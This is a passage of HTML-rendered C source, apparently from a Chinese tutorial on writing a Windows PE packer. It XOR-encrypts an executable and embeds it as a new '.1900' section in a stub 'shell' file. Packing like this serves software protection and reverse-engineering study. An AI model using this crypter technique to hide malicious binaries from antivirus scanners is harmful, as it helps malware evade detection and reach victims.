</pre></td></tr><tr><td data-num="38"></td><td><pre>                          <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="39"></td><td><pre>                          OPEN_EXISTING<span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="40"></td><td><pre>                          FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre> </pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hOrgFile <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"CreateFile OrigFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    dwOrgFileSize <span class="token operator">=</span> <span class="token function">GetFileSize</span><span class="token punctuation">(</span>hOrgFile<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre> </pre></td></tr><tr><td data-num="50"></td><td><pre>    pOrgBase <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> dwOrgFileSize<span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pOrgBase<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"VirtualAlloc pOrgBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="57"></td><td><pre> </pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span>pOrgBase<span class="token punctuation">,</span> dwOrgFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>hOrgFile<span class="token punctuation">,</span> pOrgBase<span class="token punctuation">,</span> dwOrgFileSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwRet<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"ReadFile pOrgBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre> </pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token function">EncpyptFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span>pOrgBase<span class="token punctuation">,</span> dwOrgFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 对源程序进行 XOR 加密</span></pre></td></tr><tr><td data-num="67"></td><td><pre> </pre></td></tr><tr><td data-num="68"></td><td><pre>    hShellFile <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>SHELL_FILE_NAME<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="69"></td><td><pre>                GENERIC_READ<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="70"></td><td><pre>                <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="71"></td><td><pre>                OPEN_EXISTING<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="72"></td><td><pre>                FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hShellFile <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"CreateFile ShellFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    dwShellFileSize <span class="token operator">=</span> <span class="token function">GetFileSize</span><span class="token punctuation">(</span>hShellFile<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="80"></td><td><pre> </pre></td></tr><tr><td data-num="81"></td><td><pre>    pShellBase <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> dwShellFileSize <span class="token operator">+</span> dwOrgFileSize<span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pShellBase<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="83"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"VirtualAlloc pShellBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="88"></td><td><pre> </pre></td></tr><tr><td data-num="89"></td><td><pre>    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span>pShellBase<span class="token punctuation">,</span> dwShellFileSize <span class="token operator">+</span> dwOrgFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>hShellFile<span class="token punctuation">,</span> pShellBase<span class="token punctuation">,</span> dwShellFileSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwRet<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="91"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"ReadFile pShellBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="95"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="96"></td><td><pre> </pre></td></tr><tr><td data-num="97"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">AddSection</span><span class="token punctuation">(</span>pShellBase<span class="token punctuation">,</span> pOrgBase<span class="token punctuation">,</span> dwShellFileSize<span class="token punctuation">,</span> dwOrgFileSize<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="99"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="100"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>exit<span class="token operator">:</span></pre></td></tr><tr><td data-num="103"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hOrgFile<span class="token punctuation">)</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hOrgFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hShellFile<span class="token punctuation">)</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hShellFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="105"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pOrgBase<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="106"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="107"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">VirtualFree</span><span class="token punctuation">(</span>pOrgBase<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_DECOMMIT<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="108"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="109"></td><td><pre>            <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"VirtualFree pOrgBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="110"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="112"></td><td><pre> </pre></td></tr><tr><td data-num="113"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pShellBase<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="114"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="115"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">VirtualFree</span><span class="token punctuation">(</span>pShellBase<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_DECOMMIT<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="116"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>            <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"VirtualFree pShellBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="119"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="120"></td><td><pre>    <span class="token keyword">return</span> bRet<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="122"></td><td><pre> </pre></td></tr><tr><td data-num="123"></td><td><pre>BOOL <span class="token function">AddSection</span><span class="token punctuation">(</span>PVOID pShellBase<span class="token punctuation">,</span> PVOID pOrgBase<span class="token punctuation">,</span> DWORD dwShellFileSize<span class="token punctuation">,</span> DWORD dwOrgFileSize<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="125"></td><td><pre>    BOOL bRet <span class="token operator">=</span> TRUE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="126"></td><td><pre>    DWORD dwRet <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="127"></td><td><pre>    HANDLE hFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre>    PIMAGE_DOS_HEADER pShellDosHead <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pShellBase<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="129"></td><td><pre>    PIMAGE_FILE_HEADER pShellFileHead <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_FILE_HEADER<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pShellBase <span class="token operator">+</span> pShellDosHead<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>    PIMAGE_OPTIONAL_HEADER32 pShellOptionHead <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pShellFileHead <span class="token operator">+</span> IMAGE_SIZEOF_FILE_HEADER<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="131"></td><td><pre>    PIMAGE_SECTION_HEADER pShellSectionHead <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_SECTION_HEADER<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pShellOptionHead <span class="token operator">+</span> pShellFileHead<span class="token operator">-></span>SizeOfOptionalHeader<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>    DWORD dwFileAlignment <span class="token operator">=</span> pShellOptionHead<span class="token operator">-></span>FileAlignment<span class="token punctuation">,</span> dwSectionAlignment <span class="token operator">=</span> pShellOptionHead<span class="token operator">-></span>SectionAlignment<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>    DWORD dwSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>    PVOID pResBase <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="135"></td><td><pre> </pre></td></tr><tr><td data-num="136"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pShellSectionHead<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token operator">&amp;</span>pShellSectionHead<span class="token punctuation">[</span>pShellFileHead<span class="token operator">-></span>NumberOfSections <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pShellBase<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="137"></td><td><pre>                                    <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token operator">*</span> IMAGE_SIZEOF_SECTION_HEADER<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="138"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"壳子最后一个节表间隙不够\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="141"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="142"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="143"></td><td><pre>     </pre></td></tr><tr><td data-num="144"></td><td><pre>    dwSize <span class="token operator">=</span> <span class="token function">Align</span><span class="token punctuation">(</span>dwOrgFileSize <span class="token operator">+</span> dwShellFileSize<span class="token punctuation">,</span> dwFileAlignment<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//dwFileAlignment 整数倍</span></pre></td></tr><tr><td data-num="145"></td><td><pre>    pResBase <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="146"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pResBase<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="147"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="148"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"VirtualAlloc pResBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="149"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="152"></td><td><pre> </pre></td></tr><tr><td data-num="153"></td><td><pre>    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span>pResBase<span class="token punctuation">,</span> dwSize<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span>pResBase<span class="token punctuation">,</span> pShellBase<span class="token punctuation">,</span> dwShellFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将源文件复制到壳子中</span></pre></td></tr><tr><td data-num="155"></td><td><pre>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pResBase <span class="token operator">+</span> dwShellFileSize<span class="token punctuation">)</span><span class="token punctuation">,</span> pOrgBase<span class="token punctuation">,</span> dwOrgFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 将源文件复制到壳子中</span></pre></td></tr><tr><td data-num="156"></td><td><pre>     </pre></td></tr><tr><td data-num="157"></td><td><pre>    PIMAGE_DOS_HEADER pResDosHead <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pResBase<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="158"></td><td><pre>    PIMAGE_FILE_HEADER pResFileHead <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_FILE_HEADER<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pResBase <span class="token operator">+</span> pResDosHead<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>    PIMAGE_OPTIONAL_HEADER32 pResOptionHead <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pResFileHead <span class="token operator">+</span> IMAGE_SIZEOF_FILE_HEADER<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>    PIMAGE_SECTION_HEADER pResSectionHead <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_SECTION_HEADER<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pResOptionHead <span class="token operator">+</span> pResFileHead<span class="token operator">-></span>SizeOfOptionalHeader<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>     </pre></td></tr><tr><td data-num="162"></td><td><pre>    <span class="token comment">// 增加节表</span></pre></td></tr><tr><td data-num="163"></td><td><pre>    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>pResSectionHead<span class="token punctuation">[</span>pShellFileHead<span class="token operator">-></span>NumberOfSections<span class="token punctuation">]</span><span class="token punctuation">,</span> IMAGE_SIZEOF_SECTION_HEADER<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="164"></td><td><pre>    <span class="token function">memcpy</span><span class="token punctuation">(</span>pResSectionHead<span class="token punctuation">[</span>pResFileHead<span class="token operator">-></span>NumberOfSections<span class="token punctuation">]</span><span class="token punctuation">.</span>Name<span class="token punctuation">,</span> <span class="token string">".1900"</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">".1900"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="165"></td><td><pre>    pResSectionHead<span class="token punctuation">[</span>pResFileHead<span class="token operator">-></span>NumberOfSections<span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData <span class="token operator">=</span> pResSectionHead<span class="token punctuation">[</span>pShellFileHead<span class="token operator">-></span>NumberOfSections <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData</pre></td></tr><tr><td data-num="166"></td><td><pre>                                                                           <span class="token operator">+</span> <span class="token function">Align</span><span class="token punctuation">(</span>pShellSectionHead<span class="token punctuation">[</span>pShellFileHead<span class="token operator">-></span>NumberOfSections <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">,</span> dwFileAlignment<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="167"></td><td><pre>    pResSectionHead<span class="token punctuation">[</span>pResFileHead<span class="token operator">-></span>NumberOfSections<span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData <span class="token operator">=</span> <span class="token function">Align</span><span class="token punctuation">(</span>dwOrgFileSize<span class="token punctuation">,</span> dwFileAlignment<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>    pResSectionHead<span class="token punctuation">[</span>pResFileHead<span class="token operator">-></span>NumberOfSections<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">=</span> pResSectionHead<span class="token punctuation">[</span>pShellFileHead<span class="token operator">-></span>NumberOfSections <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress</pre></td></tr><tr><td data-num="169"></td><td><pre>                                                                            <span class="token operator">+</span> <span class="token function">Align</span><span class="token punctuation">(</span>pResSectionHead<span class="token punctuation">[</span>pShellFileHead<span class="token operator">-></span>NumberOfSections <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize<span class="token punctuation">,</span> dwSectionAlignment<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>    pResSectionHead<span class="token punctuation">[</span>pResFileHead<span class="token operator">-></span>NumberOfSections<span class="token punctuation">]</span><span class="token punctuation">.</span>Misc<span class="token punctuation">.</span>VirtualSize <span class="token operator">=</span> dwOrgFileSize<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>    pResSectionHead<span class="token punctuation">[</span>pResFileHead<span class="token operator">-></span>NumberOfSections<span class="token punctuation">]</span><span class="token punctuation">.</span>Characteristics <span class="token operator">|=</span> IMAGE_SCN_MEM_READ<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre> </pre></td></tr><tr><td data-num="173"></td><td><pre>    pResFileHead<span class="token operator">-></span>NumberOfSections<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment">// 增加节数量</span></pre></td></tr><tr><td data-num="174"></td><td><pre>    pResOptionHead<span class="token operator">-></span>SizeOfImage <span class="token operator">+=</span> <span class="token function">Align</span><span class="token punctuation">(</span>dwOrgFileSize<span class="token punctuation">,</span> dwSectionAlignment<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 增加 SizeOfImage</span></pre></td></tr><tr><td data-num="175"></td><td><pre> </pre></td></tr><tr><td data-num="176"></td><td><pre>    hFile <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>TARGET_FILE_NAME<span class="token punctuation">,</span>      <span class="token comment">// 打开目标文件并保存</span></pre></td></tr><tr><td data-num="177"></td><td><pre>                       GENERIC_READ <span class="token operator">|</span> GENERIC_WRITE<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="178"></td><td><pre>                       <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="179"></td><td><pre>                       CREATE_ALWAYS<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="180"></td><td><pre>                       FILE_ATTRIBUTE_NORMAL<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="181"></td><td><pre>                       <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="182"></td><td><pre> </pre></td></tr><tr><td data-num="183"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hFile <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="184"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"CreateFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="187"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="188"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="189"></td><td><pre> </pre></td></tr><tr><td data-num="190"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> pResBase<span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwRet<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="191"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="192"></td><td><pre>        <span class="token function">ShowError</span><span class="token punctuation">(</span><span class="token string">"WriteFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="193"></td><td><pre>        bRet <span class="token operator">=</span> FALSE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="194"></td><td><pre>        <span class="token keyword">goto</span> exit<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="195"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="196"></td><td><pre> </pre></td></tr><tr><td data-num="197"></td><td><pre>exit<span class="token operator">:</span></pre></td></tr><tr><td data-num="198"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hFile<span class="token punctuation">)</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="199"></td><td><pre>    <span class="token keyword">return</span> bRet<span class="token punctuation">;</span></pre></td></tr><tr><td 